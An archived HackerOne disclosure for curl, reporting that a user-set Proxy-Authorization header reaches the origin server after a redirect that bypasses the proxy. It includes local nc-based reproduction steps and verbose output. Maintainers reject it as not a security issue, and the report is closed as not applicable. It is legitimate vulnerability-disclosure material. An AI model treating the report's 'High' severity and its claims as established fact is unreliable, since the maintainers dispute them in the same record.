---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/information-exposure-through-sent-data
  - env/web
substate: "not-applicable"
weakness: "Information Exposure Through Sent Data"
enriched: true
body: true
date: 2025-12-30
submitted: 2025-12-28T16:18:09.549Z
bounty_usd: null
votes: 18
cve: []
program: "[[programs/curl|curl]]"
reporter: "yupiy"
source: "https://hackerone.com/reports/3480713"
title: "Proxy-Authorization header is leaked to origin server after redirect from proxied to direct connection"
---
# Proxy-Authorization header is leaked to origin server after redirect from proxied to direct connection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 18 | **Program:** curl | **Disclosed:** 2025-12-30

- Report: [https://hackerone.com/reports/3480713](https://hackerone.com/reports/3480713)
- CWE: Information Exposure Through Sent Data
- Submitted: 2025-12-28T16:18:09.549Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

curl leaks the Proxy-Authorization header to the origin server after following an HTTP redirect that transitions from a proxied connection to a direct connection (e.g. when using --noproxy or when proxy is bypassed after redirect). This causes proxy credentials (which are hop-by-hop) to be sent to unintended servers.

## Affected version

Tested with:
curl 8.17.0 on Linux x86_64

curl -V:
[PASTE curl -V OUTPUT HERE]

## Steps To Reproduce

1. Start a fake origin server:

   nc -l -p 8080

2. Start a fake proxy that redirects to the origin:

   printf "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:8080/\r\nContent-Length: 0\r\n\r\n" | nc -l -p 3128

3. Run curl:

   curl -v -L \
     -x http://127.0.0.1:3128 \
     -H "Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR" \
     --noproxy 127.0.0.1 \
     http://example.com

4. Observe the request received by the origin server.

## Observed Behavior

### curl verbose output:

*   Trying 127.0.0.1:3128...
* Established connection to 127.0.0.1 (127.0.0.1 port 3128)
> GET http://example.com/ HTTP/1.1
> Host: example.com
> User-Agent: curl/8.17.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR
>
< HTTP/1.1 302 Found
< Location: http://127.0.0.1:8080/
< Content-Length: 0
* Issue another request to this URL: 'http://127.0.0.1:8080/'
*   Trying 127.0.0.1:8080...
* Established connection to 127.0.0.1 (127.0.0.1 port 8080)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.17.0
> Accept: */*
> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR

### Origin server output (nc -l -p 8080):

GET / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: curl/8.17.0
Accept: */*
Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR

## Expected Behavior

The Proxy-Authorization header must never be forwarded to origin servers and should be stripped when the request is sent directly instead of via a proxy.


## Supporting Material

Attached:
- curl verbose output showing header leakage
- Origin server log showing leaked Proxy-Authorization header

## Impact

## Impact

An attacker-controlled origin server can steal proxy credentials if a proxied request is redirected to a direct connection. This violates HTTP semantics (Proxy-Authorization is hop-by-hop) and can result in credential compromise and unauthorized proxy access.

## Timeline

- **Report Filed**
- **2025-12-28** @bagder: Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.
- **2025-12-28** @bagder: This is an example of a user explicitly sending this header.

1. curl makes no claims that it will *not* send this header in redirects
2. we *warn* users about doing exactly this (using custom headers in combination with redirects)
3. curl provides options to set the proxy credentials that don't have this problem

I don't think this is a curl security problem.
- **2025-12-28** @jimfuller2024: in RFC7230 we have "Hop-by-hop headers are meaningful only for a single transport-level connection, and must not be forwarded by proxies.”

and RFC7235 we have “The Proxy-Authorization request-header field allows the client to identify itself (or its user) to a proxy that requires authentication. A proxy MAY remove Proxy-Authorization fields from a request before forwarding the request.”

the above engage based on the context of each 'hop' eg.  In the scenarios outlined in this report these - the user should not be surprised if using --noproxy or using custom headers with redirects that headers can be forwarded (there is no proxy). 

We might consider more documentation or perhaps an explicit warnings but that could be litigated as a PR against the project.   

The logic of the application invoking curl or using libcurl should be the one deciding when to set  a custom header or not.  Asking curl to make a raw curl call 'more secure' seems like a slippery slope to me ... not a security problem (though keeping an open mind given more information).
- **Report Not Applicable**
- **Agreed On Going Public**
- **Manually Disclosed**
